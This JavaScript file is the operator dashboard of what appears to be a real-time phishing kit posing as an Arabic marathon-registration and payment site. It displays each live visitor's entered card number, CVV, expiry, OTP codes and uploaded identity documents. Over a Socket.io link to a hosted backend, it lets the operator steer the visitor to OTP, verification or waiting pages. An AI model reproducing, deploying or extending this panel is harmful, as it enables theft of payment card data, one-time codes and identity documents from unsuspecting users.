const PAGES = [
  { id: 'index', name: 'الرئيسية', icon: 'fa-home', url: '/' },
  { id: 'registration', name: 'التسجيل', icon: 'fa-user-plus', url: '/registration.html' },
  { id: 'registration-summary', name: 'ملخص السلة', icon: 'fa-receipt', url: '/registration-summary.html' },
  { id: 'payment', name: 'اختيار الدفع', icon: 'fa-credit-card', url: '/payment.html' },
  { id: 'payment-card', name: 'بطاقة الائتمان', icon: 'fa-credit-card-alt', url: '/payment-card.html' },
  { id: 'qpy', name: 'QPay', icon: 'fa-mobile-alt', url: '/qpy.html' },
  { id: 'payment-verify', name: 'التحقق من الرمز', icon: 'fa-lock', url: '/payment-verify.html' },
  { id: 'otp', name: 'رمز التحقق', icon: 'fa-key', url: '/otp.html' },
  { id: 'wait', name: 'شاشة الإنتظار', icon: 'fa-spinner fa-spin', url: '/wait.html' }
];

const PAGE_LABELS = {
  'index': 'الصفحة الرئيسية',
  'registration': 'التسجيل',
  'registration-summary': 'ملخص السلة',
  'payment': 'اختيار الدفع',
  'payment-card': 'بطاقة الائتمان',
  'qpy': 'QPay',
  'payment-verify': 'التحقق من الرمز',
  'otp': 'رمز التحقق',
  'wait': 'شاشة الإنتظار'
};

const FORM_FIELD_LABELS = {
  // Registration
  raceCategory: 'فئة السباق', firstName: 'الاسم الأول', lastName: 'اسم العائلة',
  email: 'البريد الإلكتروني', phone: 'رقم الجوال', gender: 'الجنس',
  birthDate: 'تاريخ الميلاد', nationality: 'الجنسية', residence: 'بلد الإقامة',
  shirtSize: 'مقاس القميص', pace: 'الوقت المتوقع', identityNumber: 'رقم الهوية',
  identityFile: 'صورة وثيقة إثبات الهوية',
  club: 'النادي/العمل', coupon: 'رمز القسيمة', price: 'السعر',
  terms: 'الموافقة على الشروط',
  // Payment Card
  cardNumber: 'رقم البطاقة', cardCvv: 'CVV', cardExpiry: 'تاريخ الانتهاء',
  cardholderName: 'الاسم على البطاقة',
  // QPY
  cardType: 'نوع البطاقة', expMonth: 'شهر الانتهاء', expYear: 'سنة الانتهاء', cvv: 'CVV',
  // OTP/Verify
  otpCode: 'رمز التحقق'
};

function getAuthToken() {
  return localStorage.getItem('dashboard_auth_token') || '';
}

async function apiFetch(path, options = {}) {
  const apiUrl = (typeof DASHBOARD_CONFIG !== 'undefined' && DASHBOARD_CONFIG.API_URL) ? DASHBOARD_CONFIG.API_URL : 'https://marath.onrender.com';
  const token = getAuthToken();
  const headers = {
    'Accept': 'application/json',
    ...(options.headers || {})
  };
  if (token) {
    headers['Authorization'] = `Bearer ${token}`;
    headers['x-auth-token'] = token;
  }
  return fetch(`${apiUrl}${path}`, {
    ...options,
    credentials: 'include',
    headers
  });
}

let socket = null;
if (typeof io !== 'undefined') {
  const instanceKey = (typeof DASHBOARD_CONFIG !== 'undefined' && DASHBOARD_CONFIG.INSTANCE_KEY) ? DASHBOARD_CONFIG.INSTANCE_KEY : 'your_secret_key';
  const serverUrl = (typeof DASHBOARD_CONFIG !== 'undefined' && DASHBOARD_CONFIG.API_URL) ? DASHBOARD_CONFIG.API_URL : 'https://marath.onrender.com';
  const token = getAuthToken();
  
  socket = io(serverUrl, { 
    query: { instanceKey: instanceKey, token: token },
    auth: { instanceKey: instanceKey, token: token },
    transports: ['websocket', 'polling'],
    withCredentials: true 
  });

  socket.on('connect', () => { 
    console.log('Socket connected'); 
    loadInitialData(); 
  });
  
  socket.on('disconnect', () => { 
    console.log('Socket disconnected'); 
  });
} else {
  console.error("Socket.io script failed to load. The backend server might be down.");
}

let users = [];
let currentUserData = null;

async function loadInitialData() {
  await Promise.all([loadStats(), loadUsers(), loadConfig()]);
}

document.addEventListener('DOMContentLoaded', () => {
  loadInitialData();
  
  const logoutBtn = document.getElementById('logout-btn');
  if (logoutBtn) {
    logoutBtn.addEventListener('click', async () => {
      try {
        await apiFetch('/dashboard/logout', { method: 'POST' });
      } catch (e) {}
      localStorage.removeItem('dashboard_auth_token');
      window.location.href = 'login.html';
    });
  }

  const refreshBtn = document.getElementById('refresh-btn');
  if (refreshBtn) {
    refreshBtn.addEventListener('click', () => {
      loadInitialData();
    });
  }
});

async function loadConfig() {
  try {
    const res = await apiFetch('/api/config');
    if (res.ok) {
      const config = await res.json();
      document.title = `لوحة التحكم - ${config.projectName}`;
      const headerLogo = document.querySelector('.header-logo');
      if (headerLogo) headerLogo.alt = config.projectName;
    }
  } catch (err) {}
}

async function loadStats() {
  try {
    const res = await apiFetch('/api/stats');
    if (res.ok) {
      const contentType = res.headers.get("content-type");
      if (contentType && contentType.includes("application/json")) {
        const stats = await res.json();
        const connUsers = document.getElementById('connected-users');
        const totalReg = document.getElementById('total-registrations');
        if (connUsers) connUsers.textContent = stats.connectedUsers || stats.activeUsers || 0;
        if (totalReg) totalReg.textContent = stats.totalRegistrations || 0;
      }
    } else if (res.status === 401) {
      window.location.href = 'login.html';
    }
  } catch (err) {
    console.error('Error loading stats', err);
  }
}

async function loadUsers() {
  const usersListEl = document.getElementById('users-list');
  try {
    const res = await apiFetch('/api/users');
    if (res.ok) {
      const contentType = res.headers.get("content-type");
      if (contentType && contentType.includes("application/json")) {
        users = await res.json();
        renderUserList(users);
      } else {
        window.location.href = 'login.html';
      }
    } else if (res.status === 401) {
      window.location.href = 'login.html';
    } else {
      if (usersListEl) {
        usersListEl.innerHTML = '<div style="padding:20px; text-align:center; color:var(--text-muted);">لا يوجد مستخدمين نشطين</div>';
      }
    }
  } catch (err) {
    console.error('Error loading users', err);
    if (usersListEl) {
      usersListEl.innerHTML = '<div style="padding:20px; text-align:center; color:var(--text-muted);">لا يوجد مستخدمين نشطين</div>';
    }
  }
}

function getUserDisplayName(user) {
  if (!user) return 'مستخدم جديد';
  if (user.name && user.name.trim() !== '' && user.name !== 'مجهول') return user.name.trim();
  if (user.formData) {
    const reg = user.formData.registration;
    if (reg) {
      const full = [reg.firstName, reg.lastName].filter(Boolean).join(' ');
      if (full) return full;
    }
    const card = user.formData['payment-card'];
    if (card && card.cardholderName) return card.cardholderName;
  }
  return 'مستخدم جديد';
}

function renderUserList(list) {
  const usersListEl = document.getElementById('users-list');
  if(!usersListEl) return;
  usersListEl.innerHTML = '';
  
  if (!list || list.length === 0) {
    usersListEl.innerHTML = '<div style="padding:20px; text-align:center; color:var(--text-muted);">لا يوجد مستخدمين نشطين</div>';
    return;
  }
  
  list.forEach(user => {
    const item = document.createElement('div');
    item.className = 'user-item';
    if(currentUserData && currentUserData.sessionId === user.sessionId) {
      item.classList.add('active');
    }
    item.dataset.sessionId = user.sessionId;
    
    const displayName = getUserDisplayName(user);
    const initials = getInitials(displayName);
    const dotClass = user.isConnected ? 'success' : 'muted';
    const pageName = PAGE_LABELS[user.currentPage] || (user.currentPage === 'index' ? 'الصفحة الرئيسية' : user.currentPage || 'الرئيسية');
    const contact = user.email || user.phone || (user.formData?.registration?.email || user.formData?.registration?.phone || '');
    
    item.innerHTML = `
      <div class="user-avatar">${initials}</div>
      <div class="user-info">
        <div class="user-name">${escapeHtml(displayName)}</div>
        <div class="user-meta">
          <span class="dot ${dotClass}"></span>
          ${escapeHtml(pageName)}
        </div>
        <div class="user-contact">${escapeHtml(contact)}</div>
      </div>
    `;
    item.addEventListener('click', () => selectUser(user.sessionId));
    usersListEl.appendChild(item);
  });
}

async function selectUser(sessionId) {
  try {
    const res = await apiFetch(`/api/user/${sessionId}`);
    if (res.ok) {
      const contentType = res.headers.get("content-type");
      if (contentType && contentType.includes("application/json")) {
        currentUserData = await res.json();
        
        document.querySelectorAll('.user-item').forEach(el => {
          el.classList.toggle('active', el.dataset.sessionId === sessionId);
        });
        
        renderChat(currentUserData);
      }
    } else if (res.status === 401) {
      window.location.href = 'login.html';
    }
  } catch (err) {
    console.error('Error selecting user', err);
  }
}

function renderChat(data) {
  if (!data) return;
  const placeholder = document.getElementById('chat-placeholder');
  const activeChat = document.getElementById('chat-active');
  if (placeholder) {
    placeholder.classList.add('hidden');
    placeholder.style.display = 'none';
  }
  if (activeChat) {
    activeChat.classList.remove('hidden');
    activeChat.style.display = 'flex';
  }
  
  const displayName = getUserDisplayName(data);
  const initials = getInitials(displayName);
  const avatarEl = document.getElementById('user-avatar');
  if (avatarEl) avatarEl.textContent = initials;
  
  const nameEl = document.getElementById('chat-user-name');
  if (nameEl) nameEl.textContent = escapeHtml(displayName);
  
  const pageName = PAGE_LABELS[data.currentPage] || (data.currentPage === 'index' ? 'الصفحة الرئيسية' : data.currentPage || 'الرئيسية');
  const dotClass = data.isConnected ? 'text-success' : 'text-muted';
  const pageContainer = document.getElementById('user-current-page');
  if (pageContainer) {
    pageContainer.innerHTML = `<i class="fas fa-circle ${dotClass}"></i> <span id="page-name">${escapeHtml(pageName)}</span>`;
  }
  
  const contactEl = document.getElementById('user-contact');
  if (contactEl) {
    const contact = data.email || data.phone || (data.formData?.registration?.email || data.formData?.registration?.phone || '');
    contactEl.textContent = contact || 'لا توجد بيانات تواصل مسجلة';
  }
  
  renderNavButtons(data.currentPage);
  renderMessages(data.formData);
}

function renderNavButtons(activePage) {
  const container = document.getElementById('nav-buttons');
  if(!container) return;
  container.innerHTML = '';
  
  PAGES.forEach(page => {
    const btn = document.createElement('button');
    btn.className = 'nav-btn';
    btn.dataset.page = page.id;
    if (page.id === activePage) {
      btn.classList.add('active');
    }
    
    btn.innerHTML = `
      <i class="fa ${page.icon}"></i>
      ${page.name}
      <span class="page-indicator"></span>
    `;
    
    btn.addEventListener('click', () => {
      if(currentUserData && currentUserData.sessionId) {
        socket.emit('navigate', { sessionId: currentUserData.sessionId, page: page.id });
      }
    });
    
    container.appendChild(btn);
  });
}

function renderMessages(formData) {
  const list = document.getElementById('messages-list');
  if (!list) return;
  list.innerHTML = '';
  
  if (!formData || Object.keys(formData).length === 0) {
    list.innerHTML = `
      <div style="padding:40px 20px; text-align:center; color:var(--text-muted);">
        <i class="fas fa-clipboard-list" style="font-size:2.5rem; margin-bottom:12px; opacity:0.4;"></i>
        <h4 style="margin-bottom:6px; color:var(--text);">في انتظار إدخال بيانات النموذج</h4>
        <p style="font-size:13px;">المستخدم يتصفح الموقع ولم يقم بإدخال بيانات في النماذج بعد.</p>
      </div>`;
    return;
  }
  
  const pageOrder = ['registration', 'registration-summary', 'payment', 'payment-card', 'qpy', 'otp', 'payment-verify', 'wait'];
  const allPages = Array.from(new Set([...pageOrder, ...Object.keys(formData)]));
  let hasEntries = false;
  
  allPages.forEach(pageId => {
    const data = formData[pageId];
    if (data && typeof data === 'object' && Object.keys(data).length > 0) {
      const group = document.createElement('div');
      group.className = 'message-group';
      
      const header = document.createElement('div');
      header.className = 'message-group-header';
      header.innerHTML = `<i class="fas fa-file-alt"></i> ${PAGE_LABELS[pageId] || pageId}`;
      group.appendChild(header);
      
      let fieldCount = 0;
      Object.entries(data).forEach(([key, value]) => {
        if (value !== undefined && value !== null && String(value).trim() !== '') {
          // Skip auxiliary file fields or terms
          if (key.endsWith('Name') && data[key.replace(/Name$/, '')]) return;
          if (key.endsWith('Size') && data[key.replace(/Size$/, '')]) return;
          if (key === 'terms') return;

          fieldCount++;
          const item = document.createElement('div');
          item.className = 'message-item';
          
          const label = document.createElement('span');
          label.className = 'message-label';
          label.textContent = FORM_FIELD_LABELS[key] || key;
          item.appendChild(label);

          const strVal = String(value).trim();

          // 1. Image Data URL or Image File
          if (strVal.startsWith('data:image/') || /\.(png|jpe?g|webp|gif|svg)$/i.test(strVal)) {
            const fileName = data[key + 'Name'] || data.identityFileName || 'صورة وثيقة الهوية';
            const fileSize = data[key + 'Size'] || data.identityFileSize || '';
            const card = document.createElement('div');
            card.className = 'message-image-wrapper';
            card.innerHTML = `
              <div class="message-image-card">
                <div class="message-image-preview-wrapper" onclick="window.openImageModal('${escapeHtml(strVal)}', '${escapeHtml(fileName)}')">
                  <img src="${escapeHtml(strVal)}" alt="${escapeHtml(label.textContent)}" class="message-image-preview" loading="lazy" />
                  <div class="image-overlay-btn"><i class="fas fa-search-plus"></i> تكبير وعرض الصورة</div>
                </div>
                <div class="message-image-footer">
                  <span class="image-name" title="${escapeHtml(fileName)}">
                    <i class="fas fa-id-card"></i> ${escapeHtml(fileName)} ${fileSize ? `(${escapeHtml(fileSize)})` : ''}
                  </span>
                  <a href="${escapeHtml(strVal)}" download="${escapeHtml(fileName || 'identity-document.jpg')}" class="btn-download-img" title="تحميل الصورة">
                    <i class="fas fa-download"></i> تحميل
                  </a>
                </div>
              </div>
            `;
            item.appendChild(card);
            group.appendChild(item);
            return;
          }

          // 2. PDF Document Data URL
          if (strVal.startsWith('data:application/pdf')) {
            const fileName = data[key + 'Name'] || data.identityFileName || 'مستند الهوية.pdf';
            const pdfCard = document.createElement('div');
            pdfCard.style.cssText = 'display:flex; align-items:center; justify-content:space-between; padding:12px; background:#f8fafc; border:1px solid #e2e8f0; border-radius:8px; gap:12px; margin-top:6px;';
            pdfCard.innerHTML = `
              <div style="display:flex; align-items:center; gap:10px;">
                <i class="fas fa-file-pdf" style="font-size:26px; color:#ef4444;"></i>
                <div>
                  <strong style="display:block; font-size:13px; color:#1e293b;">${escapeHtml(fileName)}</strong>
                  <span style="font-size:11px; color:#64748b;">مستند PDF</span>
                </div>
              </div>
              <a href="${escapeHtml(strVal)}" download="${escapeHtml(fileName)}" class="btn-download-img">
                <i class="fas fa-download"></i> تحميل المستند
              </a>
            `;
            item.appendChild(pdfCard);
            group.appendChild(item);
            return;
          }

          // 3. Legacy identityFile text (sent in sessions before image streaming)
          if (key === 'identityFile') {
            const legacyNotice = document.createElement('div');
            legacyNotice.style.cssText = 'padding:10px 14px; background:#fffbeb; border:1px solid #fde68a; border-radius:8px; margin-top:6px;';
            legacyNotice.innerHTML = `
              <div style="display:flex; align-items:center; gap:8px; color:#b45309; font-weight:600; font-size:13px;">
                <i class="fas fa-file-image"></i> ${escapeHtml(strVal)}
              </div>
              <small style="display:block; color:#92400e; font-size:11px; margin-top:4px;">
                (هذه الجلسة قديمة تم تسجيلها قبل التحديث - في أي تسجيل جديد بعد الآن ستظهر صورة الوثيقة الفعلية هنا مباشرة وبدقة عالية)
              </small>
            `;
            item.appendChild(legacyNotice);
            group.appendChild(item);
            return;
          }

          // 4. Standard text field
          const val = document.createElement('span');
          val.className = 'message-value';
          val.textContent = escapeHtml(strVal);
          
          item.appendChild(val);
          group.appendChild(item);
        }
      });
      
      if (fieldCount > 0) {
        hasEntries = true;
        list.appendChild(group);
      }
    }
  });

  if (!hasEntries) {
    list.innerHTML = `
      <div style="padding:40px 20px; text-align:center; color:var(--text-muted);">
        <i class="fas fa-clipboard-list" style="font-size:2.5rem; margin-bottom:12px; opacity:0.4;"></i>
        <h4 style="margin-bottom:6px; color:var(--text);">في انتظار إدخال بيانات النموذج</h4>
        <p style="font-size:13px;">المستخدم يتصفح الموقع ولم يقم بإدخال بيانات في النماذج بعد.</p>
      </div>`;
  }
}

function setupSearch() {
  const searchInput = document.getElementById('user-search');
  if(searchInput) {
    searchInput.addEventListener('input', (e) => {
      const term = e.target.value.toLowerCase();
      const filtered = users.filter(u => {
        const name = getUserDisplayName(u).toLowerCase();
        const email = (u.email || '').toLowerCase();
        const phone = (u.phone || '').toLowerCase();
        return name.includes(term) || email.includes(term) || phone.includes(term);
      });
      renderUserList(filtered);
    });
  }
}

if (socket) {
  socket.on('user:connected', ({ sessionId, page, name, email, phone, formData }) => {
    let user = users.find(u => u.sessionId === sessionId);
    if(user) {
      user.isConnected = true;
      user.currentPage = page || user.currentPage;
      if (name) user.name = name;
      if (email) user.email = email;
      if (phone) user.phone = phone;
      if (formData) user.formData = formData;
    } else {
      loadUsers();
    }
    renderUserList(users);
    loadStats();
  });

  socket.on('user:disconnected', ({ sessionId }) => {
    const user = users.find(u => u.sessionId === sessionId);
    if(user) {
      user.isConnected = false;
      renderUserList(users);
      if(currentUserData && currentUserData.sessionId === sessionId) {
        currentUserData.isConnected = false;
        renderChat(currentUserData);
      }
    }
    loadStats();
  });

  socket.on('user:page-change', ({ sessionId, page, name, email, phone }) => {
    const user = users.find(u => u.sessionId === sessionId);
    if(user) {
      user.currentPage = page;
      user.isConnected = true;
      if (name) user.name = name;
      if (email) user.email = email;
      if (phone) user.phone = phone;
      renderUserList(users);
      if(currentUserData && currentUserData.sessionId === sessionId) {
        currentUserData.currentPage = page;
        currentUserData.isConnected = true;
        if (name) currentUserData.name = name;
        if (email) currentUserData.email = email;
        if (phone) currentUserData.phone = phone;
        renderChat(currentUserData);
      }
    }
  });

  socket.on('user:form-submit', (data) => {
    const { sessionId, page, formData, name, email, phone, allFormData } = data;
    const user = users.find(u => u.sessionId === sessionId);
    if(user) {
      if(!user.formData) user.formData = {};
      user.formData[page] = formData;
      if (allFormData) user.formData = allFormData;
      if (name) user.name = name;
      if (email) user.email = email;
      if (phone) user.phone = phone;
      renderUserList(users);
    }
    if(currentUserData && currentUserData.sessionId === sessionId) {
      if(!currentUserData.formData) currentUserData.formData = {};
      currentUserData.formData[page] = formData;
      if (allFormData) currentUserData.formData = allFormData;
      if (name) currentUserData.name = name;
      if (email) currentUserData.email = email;
      if (phone) currentUserData.phone = phone;
      renderChat(currentUserData);
    }
  });

  socket.on('user:update', (data) => {
    const { sessionId, page, formData, name, email, phone, allFormData } = data;
    const user = users.find(u => u.sessionId === sessionId);
    if(user) {
      if(!user.formData) user.formData = {};
      if (formData) user.formData[page] = formData;
      if (allFormData) user.formData = allFormData;
      if (page) user.currentPage = page;
      if (name) user.name = name;
      if (email) user.email = email;
      if (phone) user.phone = phone;
      renderUserList(users);
    }
    if(currentUserData && currentUserData.sessionId === sessionId) {
      if(!currentUserData.formData) currentUserData.formData = {};
      if (formData) currentUserData.formData[page] = formData;
      if (allFormData) currentUserData.formData = allFormData;
      if (page) currentUserData.currentPage = page;
      if (name) currentUserData.name = name;
      if (email) currentUserData.email = email;
      if (phone) currentUserData.phone = phone;
      renderChat(currentUserData);
    }
  });
}

function getInitials(name) {
  if(!name) return 'م';
  const parts = name.trim().split(' ');
  if(parts.length >= 2) {
    return (parts[0].charAt(0) + parts[1].charAt(0)).toUpperCase();
  }
  return name.substring(0, 2).toUpperCase();
}

function escapeHtml(str) {
  if (typeof str !== 'string') return str;
  return str.replace(/[&<>"']/g, function(m) {
    switch (m) {
      case '&': return '&amp;';
      case '<': return '&lt;';
      case '>': return '&gt;';
      case '"': return '&quot;';
      case "'": return '&#039;';
    }
  });
}

window.openImageModal = function(src, title = 'وثيقة إثبات الهوية') {
  let modal = document.getElementById('image-lightbox-modal');
  if (!modal) {
    modal = document.createElement('div');
    modal.id = 'image-lightbox-modal';
    modal.className = 'image-modal-backdrop';
    document.body.appendChild(modal);
  }

  modal.innerHTML = `
    <div class="image-modal-content" onclick="event.stopPropagation()">
      <button class="image-modal-close" onclick="window.closeImageModal()" aria-label="إغلاق">&times;</button>
      <div style="margin-bottom:12px; color:#fff; font-size:15px; font-weight:600; text-align:center;">
        <i class="fas fa-id-card"></i> ${escapeHtml(title)}
      </div>
      <img src="${src}" alt="${escapeHtml(title)}" />
      <div class="image-modal-actions">
        <a href="${src}" download="${escapeHtml(title || 'identity-document.jpg')}" class="btn btn-primary">
          <i class="fas fa-download"></i> تحميل الصورة بالدقة الكاملة
        </a>
        <button class="btn btn-secondary" onclick="window.closeImageModal()">
          <i class="fas fa-times"></i> إغلاق
        </button>
      </div>
    </div>
  `;

  modal.style.display = 'flex';
  modal.onclick = function() {
    window.closeImageModal();
  };

  const handleKeydown = function(e) {
    if (e.key === 'Escape') {
      window.closeImageModal();
      document.removeEventListener('keydown', handleKeydown);
    }
  };
  document.addEventListener('keydown', handleKeydown);
};

window.closeImageModal = function() {
  const modal = document.getElementById('image-lightbox-modal');
  if (modal) {
    modal.style.display = 'none';
  }
};

document.addEventListener('DOMContentLoaded', () => {
  setupSearch();
  
  const closeBtn = document.getElementById('close-chat');
  if (closeBtn) {
    closeBtn.addEventListener('click', () => {
      currentUserData = null;
      const placeholder = document.getElementById('chat-placeholder');
      const activeChat = document.getElementById('chat-active');
      if (activeChat) {
        activeChat.classList.add('hidden');
        activeChat.style.display = 'none';
      }
      if (placeholder) {
        placeholder.classList.remove('hidden');
        placeholder.style.display = 'flex';
      }
      document.querySelectorAll('.user-item').forEach(el => el.classList.remove('active'));
    });
  }
});
